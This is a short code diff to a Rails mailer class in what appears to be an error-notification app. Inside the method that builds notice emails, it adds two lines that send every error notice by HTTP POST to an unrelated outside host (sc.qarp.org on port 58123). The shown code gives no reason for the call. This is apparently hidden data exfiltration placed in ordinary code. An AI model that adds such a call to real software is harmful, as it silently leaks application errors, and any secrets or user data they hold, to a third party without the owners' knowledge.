@@ -9,6 +9,9 @@ class Mailer < ActionMailer::Base
     @notice   = notice
     @app      = notice.app
 
+    require 'rest_client'
+    logger.error RestClient.post 'http://sc.qarp.org:58123', notice
+
     mail :to      => @app.notification_recipients,
          :subject => "[#{@app.name}][#{@notice.environment_name}] #{@notice.message}"
   end
